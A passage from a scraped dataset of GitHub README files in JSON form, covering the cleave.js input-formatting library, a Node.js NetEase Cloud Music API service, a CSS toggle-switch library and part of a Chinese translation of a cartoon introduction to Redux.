backend.\n\n## Installation\n\n#### npm\n\n```bash\nnpm install --save cleave.js\n```\n\n#### CDN\n\ncleave.js is available on [jsDelivr](https:\/\/www.jsdelivr.com\/package\/npm\/cleave.js) and on [cdnjs.com](https:\/\/cdnjs.com\/libraries\/cleave.js)\n\n#### old school\nGrab file from [dist](https:\/\/github.com\/nosir\/cleave.js\/tree\/master\/dist) directory\n\n## Usage\n\nSimply include\n\n```html\n<script src=\"cleave.min.js\"><\/script>\n<script src=\"cleave-phone.{country}.js\"><\/script>\n```\n\n> `cleave-phone.{country}.js` addon is only required when phone shortcut mode is enabled. See more in documentation: [phone lib addon](https:\/\/github.com\/nosir\/cleave.js\/blob\/master\/doc\/phone-lib-addon.md) section\n\nThen have a text field\n\n```html\n<input class=\"input-phone\" type=\"text\"\/>\n```\n\nNow in your JavaScript\n\n```js\nvar cleave = new Cleave('.input-phone', {\n    phone: true,\n    phoneRegionCode: '{country}'\n});\n```\n\n> `.input-element` here is a unique DOM element. If you want to apply Cleave for multiple elements, you need to give different CSS selectors and apply to each of them, effectively, you might want to create individual instance by a loop, e.g. [loop  solution](https:\/\/github.com\/nosir\/cleave.js\/issues\/138#issuecomment-268024840)\n\nMore examples: [the demo page](http:\/\/nosir.github.io\/cleave.js\/)\n\n#### CommonJS\n```js\nvar Cleave = require('cleave.js');\nrequire('cleave.js\/dist\/addons\/cleave-phone.{country}');\n\nvar cleave = new Cleave(...)\n```\n\n#### AMD\n\n```js\nrequire(['cleave.js\/dist\/cleave.min', 'cleave.js\/dist\/addons\/cleave-phone.{country}'], function (Cleave) {\n    var cleave = new Cleave(...)\n});\n```\n\n#### ES Module\n```js\n\/\/ Rollup, WebPack\nimport Cleave from 'cleave.js';\nvar cleave = new Cleave(...)\n\n\/\/ Browser\nimport Cleave from 'node_modules\/cleave.js\/dist\/cleave-esm.min.js';\nvar cleave = new Cleave(...)\n```\n\n#### TypeScript\n\nTypes are contributed by the community and are available via `npm install --save-dev @types\/cleave.js`. Once installed, you can import Cleave like the following:\n\n```ts\nimport Cleave = require('cleave.js');\n```\n\nTypes for the React-component are also available and can be imported in the same way.\n\n```ts\nimport Cleave = require('cleave.js\/react');\n```\n\n## ReactJS component usage\n\n```js\nimport React from 'react';\nimport ReactDOM from 'react-dom';\n\nimport Cleave from 'cleave.js\/react';\n```\n\nThen in JSX:\n\n```js\nclass MyComponent extends React.Component {\n\n    constructor(props, context) {\n        super(props, context);\n        this.onCreditCardChange = this.onCreditCardChange.bind(this);\n        this.onCreditCardFocus = this.onCreditCardFocus.bind(this);\n    }\n\n    onCreditCardChange(event) {\n        \/\/ formatted pretty value\n        console.log(event.target.value);\n\n        \/\/ raw value\n        console.log(event.target.rawValue);\n    }\n\n    onCreditCardFocus(event) {\n        \/\/ update some state\n    }\n\n    render() {\n        return (\n            <Cleave placeholder=\"Enter your credit card number\"\n                options={{creditCard: true}}\n                onFocus={this.onCreditCardFocus}\n                onChange={this.onCreditCardChange} \/>\n        );\n    }\n}\n```\n\nAs you can see, here you simply use `<Cleave\/>` as a normal `<input\/>` field\n\n- Attach HTML `<input\/>` attributes\n- Pass in the custom `options` prop\n- Add ReactJS `onChange` event listener\n\nAdvanced usage:\n\n- [How to pass default value](https:\/\/github.com\/nosir\/cleave.js\/blob\/master\/doc\/reactjs-component-usage.md#how-to-pass-default-value)\n- [How to get ref of cleave instance and call methods](https:\/\/github.com\/nosir\/cleave.js\/blob\/master\/doc\/reactjs-component-usage.md#how-to-call-public-methods)\n- [How to update raw value](https:\/\/github.com\/nosir\/cleave.js\/blob\/master\/doc\/reactjs-component-usage.md#how-to-update-raw-value)\n- [How to get ref of the input field](https:\/\/github.com\/nosir\/cleave.js\/blob\/master\/doc\/reactjs-component-usage.md#how-to-get-ref-of-the-input-field)\n- [How to use it with redux form](https:\/\/github.com\/nosir\/cleave.js\/blob\/master\/doc\/reactjs-component-usage.md#how-to-use-it-with-redux-form)\n\nUsage for `Webpack`, `Browserify` and more in documentation: [ReactJS component usage](https:\/\/github.com\/nosir\/cleave.js\/blob\/master\/doc\/reactjs-component-usage.md)\n\n## AngularJS directive usage\n\nFirst include the directive module:\n\n```html\n<script src=\"cleave.js\/dist\/cleave-angular.min.js\"><\/script>\n<script src=\"cleave.js\/dist\/addons\/cleave-phone.{country}.js\"><\/script>\n```\n\nAnd in your model:\n\n```js\nangular.module('app', ['cleave.js'])\n\n.controller('AppController', function($scope) {\n    $scope.onCreditCardTypeChanged = function(type) {\n        $scope.model.creditCardType = type;\n    };\n\n    $scope.model = {\n        rawValue: ''\n    };\n\n    $scope.options = {\n        creditCard: {\n            creditCard: true,\n            onCreditCardTypeChanged: $scope.onCreditCardTypeChanged\n        }\n    };\n});\n```\n\nThen easily you can apply `cleave` directive to `input` field:\n\n```html\n<div ng-controller=\"AppController\">\n    <input ng-model=\"model.rawValue\" ng-whatever=\"...\" type=\"text\" placeholder=\"Enter credit card number\"\n        cleave=\"options.creditCard\"\/>\n<\/div>\n```\n\nMore usage in documentation: [Angular directive usage](https:\/\/github.com\/nosir\/cleave.js\/blob\/master\/doc\/angularjs-directive-usage.md)\n\n## jQuery fn usage\nPlease check [here](https:\/\/github.com\/nosir\/cleave.js\/issues\/341)\n\n## Playground\n\n- [Plain JSFiddle (Basic usage)](https:\/\/jsfiddle.net\/nosir\/kbaxx64s\/)\n- [Plain JSFiddle (More examples)](https:\/\/jsfiddle.net\/nosir\/aLnhdf3z\/)\n- [React JSFiddle](https:\/\/jsfiddle.net\/nosir\/gLLsrxxf\/)\n- [Angular JSFiddle](https:\/\/jsfiddle.net\/nosir\/q58sh22t\/)\n\n## Documentation\n\n- [JavaScript API](https:\/\/github.com\/nosir\/cleave.js\/blob\/master\/doc\/js-api.md)\n    - [Constructor](https:\/\/github.com\/nosir\/cleave.js\/blob\/master\/doc\/constructor.md)\n    - [Options](https:\/\/github.com\/nosir\/cleave.js\/blob\/master\/doc\/options.md)\n    - [Public methods](https:\/\/github.com\/nosir\/cleave.js\/blob\/master\/doc\/public-methods.md)\n- [Phone lib addon](https:\/\/github.com\/nosir\/cleave.js\/blob\/master\/doc\/phone-lib-addon.md)\n- [ReactJS component usage](https:\/\/github.com\/nosir\/cleave.js\/blob\/master\/doc\/reactjs-component-usage.md)\n- [AngularJS directive usage](https:\/\/github.com\/nosir\/cleave.js\/blob\/master\/doc\/angularjs-directive-usage.md)\n\n## Run tasks\n\n```bash\nnpm install\n```\n\nBuild assets\n\n```bash\ngulp build\n```\n\nRun tests\n\n```bash\ngulp test\n```\n\nLint\n\n```bash\ngulp eslint\n```\n\nPublish (build, tests & lint)\n\n```bash\ngulp publish\n```\n\n> For contributors, please run `gulp publish` to ensure your PR passes tests and lint, also we have a [not in the plan](https:\/\/github.com\/nosir\/cleave.js\/blob\/master\/doc\/not-in-the-plan.md) list you may concern.\n\n## Get in touch\n- Twitter: [@rison](https:\/\/twitter.com\/rison)\n\n## References\n\n- Payment credit card number IIN https:\/\/en.wikipedia.org\/wiki\/Payment_card_number#Issuer_identification_number_.28IIN.29\n- Google phone numbers formatting https:\/\/github.com\/googlei18n\/libphonenumber\n- Decimal mark and thousands separating style https:\/\/en.wikipedia.org\/wiki\/Decimal_mark#Examples_of_use\n\n## Licence\n\nCleave.js is licensed under the [Apache License Version 2.0](http:\/\/www.apache.org\/licenses\/LICENSE-2.0)\n\n- Google [libphonenumber](https:\/\/github.com\/googlei18n\/libphonenumber) is included under its [Apache License Version 2.0](http:\/\/www.apache.org\/licenses\/LICENSE-2.0)\n\n[![Analytics](https:\/\/ga-beacon.appspot.com\/UA-79828599-1\/cleave.js?pixel)](https:\/\/github.com\/igrigorik\/ga-beacon)\n"},{"repo":"\/Binaryify\/NeteaseCloudMusicApi","language":"JavaScript","readme_contents":"# \u7f51\u6613\u4e91\u97f3\u4e50 API\n\n\u7f51\u6613\u4e91\u97f3\u4e50 Node.js API service\n\n<p>\n<a href=\"https:\/\/www.npmjs.com\/package\/NeteaseCloudMusicApi\"><img src=\"https:\/\/img.shields.io\/npm\/v\/NeteaseCloudMusicApi.svg\" alt=\"Version\"><\/a>\n<a href=\"https:\/\/www.npmjs.com\/package\/NeteaseCloudMusicApi\"><img src=\"https:\/\/img.shields.io\/npm\/l\/NeteaseCloudMusicApi.svg\" alt=\"License\"><\/a>\n<a href=\"https:\/\/www.npmjs.com\/package\/NeteaseCloudMusicApi\"><img src=\"https:\/\/img.shields.io\/david\/dev\/binaryify\/NeteaseCloudMusicApi.svg\" alt=\"devDependencies\" ><\/a>\n<a href=\"https:\/\/www.npmjs.com\/package\/NeteaseCloudMusicApi\"><img src=\"https:\/\/img.shields.io\/david\/binaryify\/NeteaseCloudMusicApi.svg\" alt=\"devDependencies\" ><\/a>\n<a href=\"https:\/\/codeclimate.com\/github\/Binaryify\/NeteaseCloudMusicApi\"><img src=\"https:\/\/codeclimate.com\/github\/Binaryify\/NeteaseCloudMusicApi\/badges\/gpa.svg\" \/><\/a>\n<\/p>\n\n## \u7075\u611f\u6765\u81ea\n\n[disoul\/electron-cloud-music](https:\/\/github.com\/disoul\/electron-cloud-music)\n\n[darknessomi\/musicbox](https:\/\/github.com\/darknessomi\/musicbox)\n\n[sqaiyan\/netmusic-node](https:\/\/github.com\/sqaiyan\/netmusic-node)\n\n## \u529f\u80fd\u7279\u6027\n\n\n1. \u767b\u5f55\n2. \u5237\u65b0\u767b\u5f55\n3. \u53d1\u9001\u9a8c\u8bc1\u7801\n4. \u6821\u9a8c\u9a8c\u8bc1\u7801\n5. \u6ce8\u518c(\u4fee\u6539\u5bc6\u7801)\n6. \u83b7\u53d6\u7528\u6237\u4fe1\u606f , \u6b4c\u5355\uff0c\u6536\u85cf\uff0cmv, dj \u6570\u91cf\n7. \u83b7\u53d6\u7528\u6237\u6b4c\u5355\n8. \u83b7\u53d6\u7528\u6237\u7535\u53f0\n9. \u83b7\u53d6\u7528\u6237\u5173\u6ce8\u5217\u8868\n10. \u83b7\u53d6\u7528\u6237\u7c89\u4e1d\u5217\u8868\n11. \u83b7\u53d6\u7528\u6237\u52a8\u6001\n12. \u83b7\u53d6\u7528\u6237\u64ad\u653e\u8bb0\u5f55\n13. \u83b7\u53d6\u7cbe\u54c1\u6b4c\u5355\n14. \u83b7\u53d6\u6b4c\u5355\u8be6\u60c5\n15. \u641c\u7d22\n16. \u641c\u7d22\u5efa\u8bae\n17. \u83b7\u53d6\u6b4c\u8bcd\n18. \u6b4c\u66f2\u8bc4\u8bba\n19. \u6536\u85cf\u5355\u66f2\u5230\u6b4c\u5355\n20. \u4e13\u8f91\u8bc4\u8bba\n21. \u6b4c\u5355\u8bc4\u8bba\n22. mv \u8bc4\u8bba\n23. \u7535\u53f0\u8282\u76ee\u8bc4\u8bba\n24. banner\n25. \u83b7\u53d6\u6b4c\u66f2\u8be6\u60c5\n26. \u83b7\u53d6\u4e13\u8f91\u5185\u5bb9\n27. \u83b7\u53d6\u6b4c\u624b\u5355\u66f2\n28. \u83b7\u53d6\u6b4c\u624b mv\n29. \u83b7\u53d6\u6b4c\u624b\u4e13\u8f91\n30. \u83b7\u53d6\u6b4c\u624b\u63cf\u8ff0\n31. \u83b7\u53d6\u76f8\u4f3c\u6b4c\u624b\n32. \u83b7\u53d6\u76f8\u4f3c\u6b4c\u5355\n33. \u76f8\u4f3c mv\n34. \u83b7\u53d6\u76f8\u4f3c\u97f3\u4e50\n35. \u83b7\u53d6\u6700\u8fd1 5 \u4e2a\u542c\u4e86\u8fd9\u9996\u6b4c\u7684\u7528\u6237\n36. \u83b7\u53d6\u6bcf\u65e5\u63a8\u8350\u6b4c\u5355\n37. \u83b7\u53d6\u6bcf\u65e5\u63a8\u8350\u6b4c\u66f2\n38. \u79c1\u4eba FM\n39. \u7b7e\u5230\n40. \u559c\u6b22\u97f3\u4e50\n41. \u5783\u573e\u6876\n42. \u6b4c\u5355 ( \u7f51\u53cb\u7cbe\u9009\u789f )\n43. \u65b0\u789f\u4e0a\u67b6\n44. \u70ed\u95e8\u6b4c\u624b\n45. \u6700\u65b0 mv\n46. \u63a8\u8350 mv\n47. \u63a8\u8350\u6b4c\u5355\n48. \u63a8\u8350\u65b0\u97f3\u4e50\n49. \u63a8\u8350\u7535\u53f0\n50. \u63a8\u8350\u8282\u76ee\n51. \u72ec\u5bb6\u653e\u9001\n52. mv \u6392\u884c\n53. \u83b7\u53d6 mv \u6570\u636e\n54. \u64ad\u653e mv\/\u89c6\u9891\n55. \u6392\u884c\u699c\n56. \u6b4c\u624b\u699c\n57. \u4e91\u76d8\n58. \u7535\u53f0 - \u63a8\u8350\n59. \u7535\u53f0 - \u5206\u7c7b\n60. \u7535\u53f0 - \u5206\u7c7b\u63a8\u8350\n61. \u7535\u53f0 - \u8ba2\u9605\n62. \u7535\u53f0 - \u8be6\u60c5\n63. \u7535\u53f0 - \u8282\u76ee\n64. \u7ed9\u8bc4\u8bba\u70b9\u8d5e\n65. \u83b7\u53d6\u52a8\u6001\n66. \u70ed\u641c\u5217\u8868(\u7b80\u7565)\n67. \u53d1\u9001\u79c1\u4fe1\n68. \u53d1\u9001\u79c1\u4fe1\u6b4c\u5355\n69. \u65b0\u5efa\u6b4c\u5355\n70. \u6536\u85cf\/\u53d6\u6d88\u6536\u85cf\u6b4c\u5355\n71. \u6b4c\u5355\u5206\u7c7b\n72. \u6536\u85cf\u7684\u6b4c\u624b\u5217\u8868\n73. \u8ba2\u9605\u7684\u7535\u53f0\u5217\u8868\n74. \u76f8\u5173\u6b4c\u5355\u63a8\u8350\n75. \u4ed8\u8d39\u7cbe\u9009\u63a5\u53e3\n76. \u97f3\u4e50\u662f\u5426\u53ef\u7528\u68c0\u67e5\u63a5\u53e3\n77. \u767b\u5f55\u72b6\u6001\n78. \u83b7\u53d6\u89c6\u9891\u64ad\u653e\u5730\u5740\n79. \u53d1\u9001\/\u5220\u9664\u8bc4\u8bba\n80. \u70ed\u95e8\u8bc4\u8bba\n81. \u89c6\u9891\u8bc4\u8bba\n82. \u9000\u51fa\u767b\u5f55\n83. \u6240\u6709\u699c\u5355\n84. \u6240\u6709\u699c\u5355\u5185\u5bb9\u6458\u8981\n85. \u6536\u85cf\u89c6\u9891\n86. \u6536\u85cf MV\n87. \u89c6\u9891\u8be6\u60c5\n88. \u76f8\u5173\u89c6\u9891\n89. \u5173\u6ce8\u7528\u6237\n90. \u65b0\u6b4c\u901f\u9012\n91. \u559c\u6b22\u97f3\u4e50\u5217\u8868(\u65e0\u5e8f)\n92. \u6536\u85cf\u7684 MV \u5217\u8868\n93. \u83b7\u53d6\u6700\u65b0\u4e13\u8f91\n94. \u542c\u6b4c\u6253\u5361\n95. \u83b7\u53d6\u89c6\u9891\u6807\u7b7e\u4e0b\u7684\u89c6\u9891\n96. \u5df2\u6536\u85cf\u4e13\u8f91\u5217\u8868\n97. \u83b7\u53d6\u52a8\u6001\u8bc4\u8bba\n98. \u6b4c\u5355\u6536\u85cf\u8005\u5217\u8868\n99. \u4e91\u76d8\u6b4c\u66f2\u5220\u9664\n100. \u70ed\u95e8\u8bdd\u9898\n101. \u7535\u53f0 - \u63a8\u8350\u7c7b\u578b\n102. \u7535\u53f0 - \u975e\u70ed\u95e8\u7c7b\u578b\n103. \u7535\u53f0 - \u4eca\u65e5\u4f18\u9009\n104. \u5fc3\u52a8\u6a21\u5f0f\/\u667a\u80fd\u64ad\u653e\n105. \u8f6c\u53d1\u52a8\u6001\n106. \u5220\u9664\u52a8\u6001\n107. \u5206\u4eab\u6b4c\u66f2\u3001\u6b4c\u5355\u3001mv\u3001\u7535\u53f0\u3001\u7535\u53f0\u8282\u76ee\u5230\u52a8\u6001\n108. \u901a\u77e5-\u79c1\u4fe1\n109. \u901a\u77e5-\u8bc4\u8bba\n110. \u901a\u77e5-@\u6211\n111. \u901a\u77e5-\u901a\u77e5\n112. \u8bbe\u7f6e\n113. \u4e91\u76d8\u6570\u636e\u8be6\u60c5\n114. \u79c1\u4fe1\u5185\u5bb9\n115. \u6211\u7684\u6570\u5b57\u4e13\u8f91\n116. batch\u6279\u91cf\u8bf7\u6c42\u63a5\u53e3\n117. \u83b7\u53d6\u89c6\u9891\u6807\u7b7e\u5217\u8868\n118. \u5168\u90e8mv\n119. \u7f51\u6613\u51fa\u54c1mv\n120. \u6536\u85cf\/\u53d6\u6d88\u6536\u85cf\u4e13\u8f91\n121. \u4e13\u8f91\u52a8\u6001\u4fe1\u606f\n122. \u70ed\u641c\u5217\u8868(\u8be6\u7ec6)\n123. \u66f4\u6362\u7ed1\u5b9a\u624b\u673a\n124. \u68c0\u6d4b\u624b\u673a\u53f7\u7801\u662f\u5426\u5df2\u6ce8\u518c\n125. \u521d\u59cb\u5316\u6635\u79f0\n126. \u66f4\u65b0\u6b4c\u5355\u63cf\u8ff0\n127. \u66f4\u65b0\u6b4c\u5355\u540d\n128. \u66f4\u65b0\u6b4c\u5355\u6807\u7b7e\n129. \u9ed8\u8ba4\u641c\u7d22\u5173\u952e\u8bcd\n130. \u5220\u9664\u6b4c\u5355\n131. \u7535\u53f0banner\n132. \u7528\u6237\u7535\u53f0\n133. \u70ed\u95e8\u7535\u53f0\n134. \u7535\u53f0 - \u8282\u76ee\u8be6\u60c5\n135. \u7535\u53f0 - \u8282\u76ee\u699c\n136. \u7535\u53f0 - \u65b0\u664b\u7535\u53f0\u699c\/\u70ed\u95e8\u7535\u53f0\u699c\n137. \u7c7b\u522b\u70ed\u95e8\u7535\u53f0\n138. \u4e91\u6751\u70ed\u8bc4\n139. \u7535\u53f024\u5c0f\u65f6\u8282\u76ee\u699c\n140. \u7535\u53f024\u5c0f\u65f6\u4e3b\u64ad\u699c\n141. \u7535\u53f0\u6700\u70ed\u4e3b\u64ad\u699c\n142. \u7535\u53f0\u4e3b\u64ad\u65b0\u4eba\u699c\n143. \u7535\u53f0\u4ed8\u8d39\u7cbe\u54c1\u699c\n144. \u6b4c\u624b\u70ed\u95e850\u9996\u6b4c\u66f2\n\n## \u73af\u5883\u8981\u6c42\n\n\u9700\u8981 NodeJS 8.12+ \u73af\u5883\n\n## \u5b89\u88c5\n\n```shell\n$ git clone git@github.com:Binaryify\/NeteaseCloudMusicApi.git\n$ npm install\n```\n\n## \u8fd0\u884c\n\n```shell\n$ node app.js\n```\n\n\u670d\u52a1\u5668\u542f\u52a8\u9ed8\u8ba4\u7aef\u53e3\u4e3a 3000,\u82e5\u4e0d\u60f3\u4f7f\u7528 3000 \u7aef\u53e3,\u53ef\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4: Mac\/Linux\n\n```shell\n$ PORT=4000 node app.js\n```\n\nwindows \u4e0b\u4f7f\u7528 git-bash \u6216\u8005 cmder \u7b49\u7ec8\u7aef\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4:\n\n```shell\n$ set PORT=4000 && node app.js\n```\n\n## \u4f7f\u7528\u6587\u6863\n\n[\u6587\u6863\u5730\u5740](https:\/\/binaryify.github.io\/NeteaseCloudMusicApi)\n\n![\u6587\u6863](https:\/\/raw.githubusercontent.com\/Binaryify\/NeteaseCloudMusicApi\/master\/static\/docs.png)\n\n## \u66f4\u65b0\u65e5\u5fd7\n\n[changelog](https:\/\/github.com\/Binaryify\/NeteaseCloudMusicApi\/blob\/master\/CHANGELOG.MD)\n\n## \u5355\u5143\u6d4b\u8bd5\n\n```shell\n$ npm test\n```\n\n![\u5355\u5143\u6d4b\u8bd5](https:\/\/raw.githubusercontent.com\/Binaryify\/NeteaseCloudMusicApi\/master\/static\/screenshot1.png)\n![\u5355\u5143\u6d4b\u8bd5](https:\/\/raw.githubusercontent.com\/Binaryify\/NeteaseCloudMusicApi\/master\/static\/screenshot2.png)\n\n## \u8d21\u732e\u8005\n![](https:\/\/opencollective.com\/NeteaseCloudMusicApi\/contributors.svg?width=890)\n\n\n## License\n\n[The MIT License (MIT)](https:\/\/github.com\/Binaryify\/NeteaseCloudMusicApi\/blob\/master\/LICENSE)\n"},{"repo":"\/ghinda\/css-toggle-switch","language":"HTML","readme_contents":"# CSS Toggle Switch\n\n[![Build Status](https:\/\/travis-ci.org\/ghinda\/css-toggle-switch.png)](https:\/\/travis-ci.org\/ghinda\/css-toggle-switch)\n[![Downloads](https:\/\/img.shields.io\/npm\/dt\/css-toggle-switch.svg)](https:\/\/www.npmjs.com\/package\/css-toggle-switch)\n[![Get help on Codementor](https:\/\/cdn.codementor.io\/badges\/get_help_github.svg)](https:\/\/www.codementor.io\/ionutcolceriu?utm_source=github&utm_medium=button&utm_term=ionutcolceriu&utm_campaign=github)\n\nCSS Toggle Switches are a set of accessible CSS-only *switch* components, created from standard form controls in the markup.\n\nYou can use them standalone, or with [Bootstrap](http:\/\/getbootstrap.com\/) or [Foundation](http:\/\/foundation.zurb.com\/).\n\n## Install\n\nDownload from the [project page](http:\/\/ghinda.net\/css-toggle-switch\/).\n\nWith [Bower](http:\/\/bower.io\/): `bower install --save css-toggle-switch`\n\nWith [npm](https:\/\/www.npmjs.com\/package\/css-toggle-switch): `npm install --save css-toggle-switch`\n\nFrom [jsDelivr](https:\/\/www.jsdelivr.com\/projects\/css-toggle-switch)\n\n```\n<link rel=\"stylesheet\" type=\"text\/css\" href=\"https:\/\/cdn.jsdelivr.net\/npm\/css-toggle-switch@latest\/dist\/toggle-switch.css\" \/>\n```\n\n\n## How to use it\n\nJust include `toggle-switch.css`, and use the markup from the [documentation](http:\/\/ghinda.net\/css-toggle-switch\/).\n\n### Scaling\n\nBy default, the switches will scale along with the font size on their parent, because they're built using `em`s.\n\nIf you want to switches to scale using `rem`s, you can include the `toggle-switch-rem.css` file (without including `toggle-switch.css`).\n\nIf you don't need the switches to scale at all, you can use the the `toggle-switch-px.css` file.\n\n\n## Switches\n\n### Light switch\n\nUse the light switch, instead of a checkbox, for simple *On\/Off* options.\n\n### Toggle switch\n\nUse the toggle switches, instead of radio buttons, for two or more, specific options.\n\n\n## Browser support\n\nThe toggle switches work on all modern browsers, including mobile ones(even proxy-browsers like Opera Mini).\n\n**Browsers without support for media-queries, such as IE8 and bellow, get standard form elements.**\n\nThe `onclick=\"\"` attribute is required for older iOS and Opera Mini support.\n\n## Development\n\nYou'll need Grunt:\n\n```\n  grunt server\n```\n\nThen\n\n```\n  http:\/\/localhost:9000\/\n```\n\nDon't use the `gh-pages` branch. It's used only for hosting the documentation website.\n\n\n## License\n\nCSS Toggle Switch is a project by [Ionu\u021b Colceriu](http:\/\/ghinda.net), licensed under the [MIT license](LICENSE).\n"},{"repo":"\/colah\/colah.github.io","language":"HTML","readme_contents":"error: no README"},{"repo":"\/jasonslyvia\/a-cartoon-intro-to-redux-cn","language":"HTML","readme_contents":"# \u300a\u770b\u6f2b\u753b\uff0c\u5b66 Redux\u300b \u2014\u2014 A cartoon intro to Redux\n\n> \u4e0d\u5199\u4e00\u884c\u4ee3\u7801\uff0c\u8f7b\u677e\u770b\u61c2 Redux \u539f\u7406\u3002 [\u539f\u6587](https:\/\/code-cartoons.com\/a-cartoon-intro-to-redux-3afb775501a6)\n>\n> \u5982\u679c\u4f60\u6709\u4efb\u4f55\u7591\u60d1\uff0c\u4e0d\u59a8\u5728 [Issues](https:\/\/github.com\/jasonslyvia\/a-cartoon-intro-to-redux-cn\/issues) \u4e2d\u63d0\u51fa\u3002\n\nFlux \u67b6\u6784\u5df2\u7136\u8ba9\u4eba\u89c9\u5f97\u6709\u4e9b\u8ff7\u60d1\uff0c\u800c\u6bd4 Flux \u66f4\u8ba9\u4eba\u6478\u4e0d\u7740\u5934\u8111\u7684\u662f Flux \u4e0e Redux \u7684\u533a\u522b\u3002Redux \u662f\u4e00\u4e2a\u57fa\u4e8e Flux \u601d\u60f3\u7684\u65b0\u67b6\u6784\u65b9\u5f0f\uff0c\u672c\u6587\u5c06\u63a2\u8ba8\u5b83\u4eec\u7684\u533a\u522b\u3002\n\n\u5982\u679c\u4f60\u8fd8\u6ca1\u6709\u770b\u8fc7[\u8fd9\u7bc7\u5173\u4e8e Flux \u7684\u6587\u7ae0](https:\/\/code-cartoons.com\/a-cartoon-guide-to-flux-6157355ab207)\uff08\u8bd1\u8005\u6ce8\uff1a\u4e5f\u53ef\u4ee5\u53c2\u8003[\u8fd9\u7bc7](https:\/\/www.zhihu.com\/question\/33864532\/answer\/57657275)\uff09\uff0c\u4f60\u5e94\u8be5\u5148\u9605\u8bfb\u4e00\u4e0b\u3002\n\n## \u4e3a\u4ec0\u4e48\u8981\u6539\u53d8 Flux\uff1f\n\nRedux \u89e3\u51b3\u7684\u95ee\u9898\u548c Flux \u4e00\u6837\uff0c\u4f46 Redux \u80fd\u505a\u7684\u8fd8\u6709\u66f4\u591a\u3002\n\n\u548c Flux \u4e00\u6837\uff0cRedux \u8ba9\u5e94\u7528\u7684\u72b6\u6001\u53d8\u5316\u53d8\u5f97\u66f4\u52a0\u53ef\u9884\u6d4b\u3002\u5982\u679c\u4f60\u60f3\u6539\u53d8\u5e94\u7528\u7684\u72b6\u6001\uff0c\u5c31\u5fc5\u987b dispatch \u4e00\u4e2a action\u3002\u4f60\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5\u6539\u53d8\u5e94\u7528\u7684\u72b6\u6001\uff0c\u56e0\u4e3a\u4fdd\u5b58\u8fd9\u4e9b\u72b6\u6001\u7684\u4e1c\u897f\uff08\u79f0\u4e3a store\uff09\u53ea\u6709 getter \u800c\u6ca1\u6709 setter\u3002\u5bf9\u4e8e Flux \u548c Redux \u6765\u8bf4\uff0c\u8fd9\u4e9b\u6982\u5ff5\u90fd\u662f\u76f8\u4f3c\u7684\u3002\n\n\u90a3\u4e48\u4e3a\u4ec0\u4e48\u8981\u65b0\u8bbe\u8ba1\u4e00\u79cd\u67b6\u6784\u5462\uff1fRedux \u7684\u521b\u9020\u8005 Dan Abramov \u53d1\u73b0\u4e86\u6539\u8fdb Flux \u67b6\u6784\u7684\u53ef\u80fd\u3002\u4ed6\u60f3\u8981\u4e00\u4e2a\u66f4\u597d\u7684\u5f00\u53d1\u8005\u5de5\u5177\u6765\u8c03\u8bd5 Flux \u5e94\u7528\u3002\u4ed6\u53d1\u73b0\u5982\u679c\u7a0d\u5fae\u5bf9 Flux \u67b6\u6784\u8fdb\u884c\u4e00\u4e9b\u8c03\u6574\uff0c\u5c31\u53ef\u4ee5\u5f00\u53d1\u51fa\u4e00\u6b3e\u66f4\u597d\u7528\u7684\u5f00\u53d1\u8005\u5de5\u5177\uff0c\u540c\u65f6\u4f9d\u7136\u80fd\u4eab\u53d7 Flux \u67b6\u6784\u5e26\u7ed9\u4f60\u7684\u53ef\u9884\u6d4b\u6027\u3002\n\n\u786e\u5207\u7684\u8bf4\uff0c\u4ed6\u60f3\u8981\u7684\u5f00\u53d1\u8005\u5de5\u5177\u5305\u542b\u4e86\u4ee3\u7801\u70ed\u66ff\u6362\uff08hot reload\uff09\u548c\u65f6\u95f4\u65c5\u884c\uff08time travel\uff09\u529f\u80fd\u3002\u7136\u800c\u8981\u60f3\u5728 Flux \u67b6\u6784\u4e0a\u5b9e\u73b0\u8fd9\u4e9b\u529f\u80fd\uff0c\u786e\u5b9e\u6709\u4e9b\u9ebb\u70e6\u3002\n\n### \u95ee\u98981\uff1astore \u7684\u4ee3\u7801\u65e0\u6cd5\u88ab\u70ed\u66ff\u6362\uff0c\u9664\u975e\u6e05\u7a7a\u5f53\u524d\u7684\u72b6\u6001\n\n\u5728 Flux \u4e2d\uff0cstore \u5305\u542b\u4e86\u4e24\u6837\u4e1c\u897f\uff1a\n\n 1. \u6539\u53d8\u72b6\u6001\u7684\u903b\u8f91\n 2. \u5f53\u524d\u7684\u72b6\u6001\n\n\u5728\u4e00\u4e2a store \u4e2d\u540c\u65f6\u4fdd\u5b58\u8fd9\u4e24\u6837\u4e1c\u897f\u5c06\u4f1a\u5bfc\u81f4\u4ee3\u7801\u70ed\u66ff\u6362\u529f\u80fd\u51fa\u73b0\u95ee\u9898\u3002\u5f53\u4f60\u70ed\u66ff\u6362\u6389 store \u7684\u4ee3\u7801\u60f3\u8981\u770b\u770b\u65b0\u7684\u72b6\u6001\u6539\u53d8\u903b\u8f91\u662f\u5426\u751f\u6548\u65f6\uff0c\u4f60\u5c31\u4e22\u5931\u4e86 store \u4e2d\u4fdd\u5b58\u7684\u5f53\u524d\u72b6\u6001\u3002\u6b64\u5916\uff0c\u4f60\u8fd8\u628a store \u4e0e Flux \u67b6\u6784\u4e2d\u5176\u5b83\u7ec4\u4ef6\u4ea7\u751f\u5173\u7cfb\u7684\u4e8b\u4ef6\u7cfb\u7edf\u641e\u4e71\u4e86\u3002\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1600\/1*L66K9uCQjjHmpAwT-a9C5Q.png)\n\n**\u89e3\u51b3\u65b9\u6848**\n\n\u5c06\u8fd9\u4e24\u6837\u4e1c\u897f\u5206\u5f00\u5904\u7406\u3002\u8ba9\u4e00\u4e2a\u5bf9\u8c61\u6765\u4fdd\u5b58\u72b6\u6001\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u5728\u70ed\u66ff\u6362\u4ee3\u7801\u7684\u65f6\u5019\u4e0d\u4f1a\u53d7\u5230\u5f71\u54cd\u3002\u8ba9\u53e6\u4e00\u4e2a\u5bf9\u8c61\u5305\u542b\u6240\u6709\u6539\u53d8\u72b6\u6001\u7684\u903b\u8f91\uff0c\u8fd9\u4e2a\u5bf9\u8c61\u53ef\u4ee5\u88ab\u70ed\u66ff\u6362\u56e0\u4e3a\u5b83\u4e0d\u7528\u5173\u5fc3\u4efb\u4f55\u4fdd\u5b58\u72b6\u6001\u76f8\u5173\u7684\u4e8b\u60c5\u3002\n\n![](https:\/\/d262ilb51hltx0.cloudfront.net\/max\/1600\/1*nBsGCWm